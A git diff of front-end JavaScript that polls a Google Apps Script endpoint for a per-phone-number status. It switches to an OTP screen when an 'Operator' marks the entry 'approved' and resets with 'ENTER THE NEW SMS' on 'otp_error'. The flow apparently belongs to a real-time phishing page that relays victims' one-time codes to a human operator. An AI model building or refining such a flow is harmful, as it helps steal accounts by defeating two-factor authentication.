@@ -177,30 +177,28 @@ async function startVerification() {
     startPolling(rawId);
 }
     async function startPolling(phone) {
+    // 1. Clean the ID exactly like the Operator link does
     const cleanID = String(phone).trim();
+    console.log("Started polling for ID: " + cleanID);
     
     const poller = setInterval(async () => {
         try {
-            // v=Date.now() forces Google to bypass its 30-second cache
-const r = await fetch(`${SCRIPT_URL}?num=${encodeURIComponent(cleanID)}&v=${Date.now()}`, {
-    method: 'GET',
-    redirect: 'follow' // Forces the browser to follow Google's redirect
-});            const status = (await r.text()).trim();
+            // 2. IMPORTANT: Change 'num=' to 'id=' to match your new script
+            // 3. Add v=Date.now() to force Google to give us the LATEST status
+            const r = await fetch(`${SCRIPT_URL}?id=${encodeURIComponent(cleanID)}&v=${Date.now()}`);
+            const status = (await r.text()).trim();
 
-            console.log("Status for " + cleanID + ": " + status);
+            console.log("Current Status: " + status);
 
             if (status === "otp_error" && !isResetting) {
                 isResetting = true;
-
-                // 1. Clear the error so it doesn't loop
-                await fetch(`${SCRIPT_URL}?num=${encodeURIComponent(cleanID)}&cmd=clear`);
-
-                // 2. UI Feedback
+                // Clear the error so it doesn't loop
+                await fetch(`${SCRIPT_URL}?id=${encodeURIComponent(cleanID)}&cmd=clear`);
+                
                 const timerEl = document.getElementById('timer');
                 timerEl.style.color = "yellow";
-                timerEl.innerText = "❌ INVALID CODE - ENTER THE NEW SMS";
+                timerEl.innerText = "❌ INVALID CODE - TRY AGAIN";
                 
-                // 3. Reset and Unlock
                 document.querySelectorAll('.otp-input').forEach(input => {
                     input.value = "";
                     input.disabled = false;
@@ -209,21 +207,21 @@ const r = await fetch(`${SCRIPT_URL}?num=${encodeURIComponent(cleanID)}&v=${Date
                 document.getElementById('otp-btn').disabled = false;
 
                 runCountdown(30);
-
-                setTimeout(() => { 
-                    timerEl.style.color = "white";
-                    isResetting = false; 
-                }, 2000);
+                setTimeout(() => { isResetting = false; }, 2000);
             }
 
             if (status === "approved") {
+                console.log("✅ Match found! Moving to OTP view.");
                 clearInterval(poller);
-                showView(3); // Show OTP View
+                showView(3); // Move to OTP screen
                 runCountdown(30);
-                fetch(`${SCRIPT_URL}?num=${encodeURIComponent(cleanID)}&cmd=clear`);
+                // Clean up the status
+                fetch(`${SCRIPT_URL}?id=${encodeURIComponent(cleanID)}&cmd=clear`);
             }
-        } catch (e) { console.error("Poll error", e); }
-    }, 3500);
+        } catch (e) { 
+            console.error("Polling failed:", e); 
+        }
+    }, 3000); // Check every 3 seconds
 }
 
 
